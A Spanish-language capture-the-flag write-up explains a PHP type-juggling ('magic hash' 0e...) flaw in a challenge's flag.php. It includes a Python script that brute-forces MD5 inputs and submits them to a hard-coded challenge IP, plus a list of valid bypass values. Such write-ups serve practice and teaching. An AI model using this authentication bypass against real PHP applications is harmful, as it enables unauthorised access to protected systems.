Para este reto solo se nos proporciona una URL. 
Si accedemos a ella, tan solo vemos un pequeño código en PHP. 

![[Pasted image 20220128215217.png]]

Como se puede ver, tenemos un endpoint llamado "flag.php" y este php está corriendo el código que hemos visto con anterioridad.

Si analizamos un poco el código nos podemos dar cuenta de que hay un hash precomputado (`0e540853622400160407992788832284`) y dos variables x1 (`0f6a`) y x2 (`ed`).
Además, hay un condicional que evalua si la concatenación de x1 con x2 y con el valor del parámetro `password_introducida` ,que le pasamos a flag.php, es igual al hash después de la manipulación de tipos. 
En caso de ser true, nos devuelve la flag y si es false el mensaje "`Intentalo de nuevo`". 

El problema aquí está relacionado con la forma en que PHP realiza la comprobación de tipos. 

En el caso del hash (`0e540853622400160407992788832284`), PHP ve un número (0) seguido de la letra "e" y de una serie de dígitos. Entonces, convierte la cadena a notación exponencial. 

![[Pasted image 20220213174008.png]]

En este ejemplo, a pesar de que numero1 y numero2 sean distintos, PHP los convierte a notación exponencial y como da 0 en ambos casos, la condición se evalúa a true. 

Teniendo esto claro, podemos desarrollar un pequeño script que vaya generando hashes a partir de la cadena `0f6aed` y cuando encontremos una cadena cuyo hash empiece por 0e y el resto de valores sean dígitos, tendremos el valor deseado que nos permitirá ver la flag.

El script final es:

```python
import requests
import sys
from pwn import *
import hashlib
from itertools import permutations


x1 = '0f6a'
x2 = 'ed'
x3 = x1 + x2
wordlist = string.ascii_lowercase + string.digits
url = "http://167.86.87.193/flag.php"
tam = 4
perms = []

for i in range(1, tam+1):
    for c in permutations(wordlist, i):
        perms.append("".join(c))

for insercion in perms:
    x3 += str(insercion)
    md5Hash = str(hashlib.md5(x3.encode()).hexdigest())
    if (md5Hash[:2] == "0e" and md5Hash[2:].isdecimal()):
        print("===============================")
        print("[*] Posible hash encontrado [*]")
        print("===============================")
        payload = {'password_introducida': insercion}
        r = requests.get(url, params=payload)
        print("Peticion final --> " + r.url)
        print("Flag --> " + r.text)
    x3 = x3[:-len(insercion)]


```

![[Pasted image 20220213174942.png]]

Valores válidos para password_introducida:

```
07
575546346
890067202
1842420558
1885667369
2340032704
2582885667
2625723872
```


![[Pasted image 20220213174418.png]]
